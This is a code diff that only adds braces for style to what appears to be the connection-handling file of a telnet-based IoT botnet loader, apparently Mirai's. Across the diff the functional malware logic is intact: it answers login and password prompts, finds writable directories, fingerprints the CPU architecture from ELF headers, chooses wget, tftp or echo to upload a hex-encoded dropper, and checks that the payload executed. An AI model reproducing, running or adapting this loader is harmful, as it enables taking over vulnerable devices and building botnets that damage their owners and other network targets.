@@ -124,10 +124,12 @@ int connection_consume_iacs(struct connection *conn)
 
                 for (i = 0; i < 3; i++)
                 {
-                    if (ptr[i] == 0xfd)
+                    if (ptr[i] == 0xfd) {
                         ptr[i] = 0xfc;
-                    else if (ptr[i] == 0xfb)
+                    }
+                    else if (ptr[i] == 0xfb) {
                         ptr[i] = 0xfd;
+                    }
                 }
 
                 send(conn->fd, ptr, 3, MSG_NOSIGNAL);
@@ -158,16 +160,20 @@ int connection_consume_login_prompt(struct connection *conn)
     {
         int tmp;
 
-        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1)
+        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1) {
             prompt_ending = tmp;
-        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) != -1)
+        }
+        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) != -1) {
             prompt_ending = tmp;
+        }
     }
 
-    if (prompt_ending == -1)
+    if (prompt_ending == -1) {
         return 0;
-    else
+    }
+    else {
         return prompt_ending;
+    }
 }
 
 int connection_consume_password_prompt(struct connection *conn)
@@ -188,14 +194,17 @@ int connection_consume_password_prompt(struct connection *conn)
     {
         int tmp;
 
-        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "assword", 7)) != -1)
+        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "assword", 7)) != -1) {
             prompt_ending = tmp;
+        }
     }
 
-    if (prompt_ending == -1)
+    if (prompt_ending == -1) {
         return 0;
-    else
+    }
+    else {
         return prompt_ending;
+    }
 }
 
 int connection_consume_prompt(struct connection *conn)
@@ -212,20 +221,24 @@ int connection_consume_prompt(struct connection *conn)
         }
     }
 
-    if (prompt_ending == -1)
+    if (prompt_ending == -1) {
         return 0;
-    else
+    }
+    else {
         return prompt_ending;
+    }
 }
 
 int connection_consume_verify_login(struct connection *conn)
 {
     int prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));
 
-    if (prompt_ending == -1)
+    if (prompt_ending == -1) {
         return 0;
-    else
+    }
+    else {
         return prompt_ending;
+    }
 }
 
 int connection_consume_psoutput(struct connection *conn)
@@ -238,8 +251,9 @@ int connection_consume_psoutput(struct connection *conn)
 
     for (i = 0; i < (offset == -1 ? conn->rdbuf_pos : offset); i++)
     {
-        if (conn->rdbuf[i] == '\r')
+        if (conn->rdbuf[i] == '\r') {
             conn->rdbuf[i] = 0;
+        }
         else if (conn->rdbuf[i] == '\n')
         {
             uint8_t option_on = 0;
@@ -251,8 +265,9 @@ int connection_consume_psoutput(struct connection *conn)
             {
                 if (start[ii] == ' ' || start[ii] == '\t' || start[ii] == 0)
                 {
-                    if (option_on > 0 && !last_character_was_space)
+                    if (option_on > 0 && !last_character_was_space) {
                         option_on++;
+                    }
                     start[ii] = 0;
                     last_character_was_space = TRUE;
                 }
@@ -286,7 +301,9 @@ int connection_consume_psoutput(struct connection *conn)
                     for (ii = 0; ii < len_proc_name; ii++)
                     {
                         if (proc_name[ii] >= '0' && proc_name[ii] <= '9')
+                        {
                             num_count++;
+                        }
                         else if ((proc_name[ii] >= 'a' && proc_name[ii] <= 'z') || (proc_name[ii] >= 'A' && proc_name[ii] <= 'Z'))
                         {
                             num_alphas++;
@@ -319,8 +336,9 @@ int connection_consume_psoutput(struct connection *conn)
     {
         for (i = 0; i < conn->rdbuf_pos; i++)
         {
-            if (conn->rdbuf[i] == 0)
+            if (conn->rdbuf[i] == 0) {
                 conn->rdbuf[i] = ' ';
+            }
         }
         return offset;
     }
@@ -332,12 +350,12 @@ int connection_consume_mounts(struct connection *conn)
     int linebuf_pos = 0, num_whitespaces = 0;
     int i, prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));
 
-    if (prompt_ending == -1)
+    if (prompt_ending == -1) {
         return 0;
+    }
 
     for (i = 0; i < prompt_ending; i++)
     {
-
         if (linebuf_pos == sizeof(linebuf) - 1)
         {
             // why are we here
@@ -358,8 +376,9 @@ int connection_consume_mounts(struct connection *conn)
             if ((mnt_info = strtok(NULL, " ")) == NULL)
                 goto dirs_end_line;
 
-            if (path[strlen(path) - 1] == '/')
+            if (path[strlen(path) - 1] == '/') {
                 path[strlen(path) - 1] = 0;
+            }
 
             if (util_memsearch(mnt_info, strlen(mnt_info), "rw", 2) != -1)
             {
@@ -372,8 +391,9 @@ int connection_consume_mounts(struct connection *conn)
         }
         else if (conn->rdbuf[i] == ' ' || conn->rdbuf[i] == '\t')
         {
-            if (num_whitespaces++ == 0)
+            if (num_whitespaces++ == 0) {
                 linebuf[linebuf_pos++] = conn->rdbuf[i];
+            }
         }
         else if (conn->rdbuf[i] != '\r')
         {
@@ -394,8 +414,9 @@ int connection_consume_written_dirs(struct connection *conn)
     int end_pos, i, offset, total_offset = 0;
     BOOL found_writeable = FALSE;
 
-    if ((end_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE))) == -1)
+    if ((end_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE))) == -1) {
         return 0;
+    }
 
     while (TRUE)
     {
@@ -403,17 +424,20 @@ int connection_consume_written_dirs(struct connection *conn)
         int pch_len;
 
         offset = util_memsearch(conn->rdbuf + total_offset, end_pos - total_offset, VERIFY_STRING_CHECK, strlen(VERIFY_STRING_CHECK));
-        if (offset == -1)
+        if (offset == -1) {
             break;
+        }
         total_offset += offset;
 
         pch = strtok(conn->rdbuf + total_offset, "\n");
-        if (pch == NULL)
+        if (pch == NULL) {
             continue;
+        }
         pch_len = strlen(pch);
 
-        if (pch[pch_len - 1] == '\r')
+        if (pch[pch_len - 1] == '\r') {
             pch[pch_len - 1] = 0;
+        }
 
         util_sockprintf(conn->fd, "rm %s/.t; rm %s/.sh; rm %s/.human\r\n", pch, pch, pch);
         if (!found_writeable)
@@ -423,8 +447,9 @@ int connection_consume_written_dirs(struct connection *conn)
                 strncpy(conn->info.writedir, pch, 32);
                 found_writeable = TRUE;
             }
-            else
+            else {
                 connection_close(conn);
+            }
         }
     }
 
@@ -435,8 +460,9 @@ int connection_consume_copy_op(struct connection *conn)
 {
     int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));
 
-    if (offset == -1)
+    if (offset == -1) {
         return 0;
+    }
     return offset;
 }
 
@@ -475,21 +501,28 @@ int connection_consume_arch(struct connection *conn)
             strncpy(conn->info.arch, "arm", 6);
         else if (ehdr->e_machine == EM_MIPS || ehdr->e_machine == EM_MIPS_RS3_LE)
         {
-            if (ehdr->e_ident[EI_DATA] == EE_LITTLE)
+            if (ehdr->e_ident[EI_DATA] == EE_LITTLE) {
                 strncpy(conn->info.arch, "mpsl", 6);
-            else
+            }
+            else {
                 strncpy(conn->info.arch, "mips", 6);
+            }
         }
-        else if (ehdr->e_machine == EM_386 || ehdr->e_machine == EM_486 || ehdr->e_machine == EM_860 || ehdr->e_machine == EM_X86_64)
+        else if (ehdr->e_machine == EM_386 || ehdr->e_machine == EM_486 || ehdr->e_machine == EM_860 || ehdr->e_machine == EM_X86_64) {
             strncpy(conn->info.arch, "x86", 6);
-        else if (ehdr->e_machine == EM_SPARC || ehdr->e_machine == EM_SPARC32PLUS || ehdr->e_machine == EM_SPARCV9)
+        }
+        else if (ehdr->e_machine == EM_SPARC || ehdr->e_machine == EM_SPARC32PLUS || ehdr->e_machine == EM_SPARCV9) {
             strncpy(conn->info.arch, "spc", 6);
-        else if (ehdr->e_machine == EM_68K || ehdr->e_machine == EM_88K)
+        }
+        else if (ehdr->e_machine == EM_68K || ehdr->e_machine == EM_88K) {
             strncpy(conn->info.arch, "m68k", 6);
-        else if (ehdr->e_machine == EM_PPC || ehdr->e_machine == EM_PPC64)
+        }
+        else if (ehdr->e_machine == EM_PPC || ehdr->e_machine == EM_PPC64) {
             strncpy(conn->info.arch, "ppc", 6);
-        else if (ehdr->e_machine == EM_SH)
+        }
+        else if (ehdr->e_machine == EM_SH) {
             strncpy(conn->info.arch, "sh4", 6);
+        }
         else
         {
             conn->info.arch[0] = 0;
@@ -500,8 +533,9 @@ int connection_consume_arch(struct connection *conn)
     {
         int offset;
 
-        if ((offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE))) != -1)
+        if ((offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE))) != -1) {
             return offset;
+        }
         if (conn->rdbuf_pos > 7168)
         {
             // Hack drain buffer
@@ -517,8 +551,9 @@ int connection_consume_arm_subtype(struct connection *conn)
 {
     int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));
 
-    if (offset == -1)
+    if (offset == -1) {
         return 0;
+    }
 
     if (util_memsearch(conn->rdbuf, offset, "ARMv7", 5) != -1 || util_memsearch(conn->rdbuf, offset, "ARMv6", 5) != -1)
     {
@@ -535,12 +570,15 @@ int connection_consume_upload_methods(struct connection *conn)
     if (offset == -1)
         return 0;
 
-    if (util_memsearch(conn->rdbuf, offset, "wget: applet not found", 22) == -1)
+    if (util_memsearch(conn->rdbuf, offset, "wget: applet not found", 22) == -1) {
         conn->info.upload_method = UPLOAD_WGET;
-    else if (util_memsearch(conn->rdbuf, offset, "tftp: applet not found", 22) == -1)
+    }
+    else if (util_memsearch(conn->rdbuf, offset, "tftp: applet not found", 22) == -1) {
         conn->info.upload_method = UPLOAD_TFTP;
-    else
+    }
+    else {
         conn->info.upload_method = UPLOAD_ECHO;
+    }
 
     return offset;
 }
@@ -549,8 +587,9 @@ int connection_upload_echo(struct connection *conn)
 {
     int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));
 
-    if (offset == -1)
+    if (offset == -1) {
         return 0;
+    }
 
     if (conn->bin == NULL)
     {
@@ -558,8 +597,9 @@ int connection_upload_echo(struct connection *conn)
         return 0;
     }
     
-    if (conn->echo_load_pos == conn->bin->hex_payloads_len)
+    if (conn->echo_load_pos == conn->bin->hex_payloads_len) {
         return offset;
+    }
 
     // echo -ne 'hex' [>]> path/FN_DROPPER
     util_sockprintf(conn->fd, "echo -ne '%s' %s " FN_DROPPER "; " TOKEN_QUERY "\r\n",
@@ -577,8 +617,9 @@ int connection_upload_wget(struct connection *conn)
 {
     int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));
 
-    if (offset == -1)
+    if (offset == -1) {
         return 0;
+    }
 
     return offset;
 }
@@ -587,17 +628,21 @@ int connection_upload_tftp(struct connection *conn)
 {
     int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));
 
-    if (offset == -1)
+    if (offset == -1) {
         return 0;
+    }
 
-    if (util_memsearch(conn->rdbuf, offset, "Permission denied", 17) != -1)
+    if (util_memsearch(conn->rdbuf, offset, "Permission denied", 17) != -1) {
         return offset * -1;
+    }
 
-    if (util_memsearch(conn->rdbuf, offset, "timeout", 7) != -1)
+    if (util_memsearch(conn->rdbuf, offset, "timeout", 7) != -1) {
         return offset * -1;
+    }
 
-    if (util_memsearch(conn->rdbuf, offset, "illegal option", 14) != -1)
+    if (util_memsearch(conn->rdbuf, offset, "illegal option", 14) != -1) {
         return offset * -1;
+    }
 
     return offset;
 }
@@ -606,21 +651,25 @@ int connection_verify_payload(struct connection *conn)
 {
     int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, EXEC_RESPONSE, strlen(EXEC_RESPONSE));
 
-    if (offset == -1)
+    if (offset == -1) {
         return 0;
+    }
 
-    if (util_memsearch(conn->rdbuf, offset, "listening tun0", 14) == -1)
+    if (util_memsearch(conn->rdbuf, offset, "listening tun0", 14) == -1) {
         return offset;
-    else
+    }
+    else {
         return 255 + offset;
+    }
 }
 
 int connection_consume_cleanup(struct connection *conn)
 {
     int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));
 
-    if (offset == -1)
+    if (offset == -1) {
         return 0;
+    }
     return offset;
 }
 
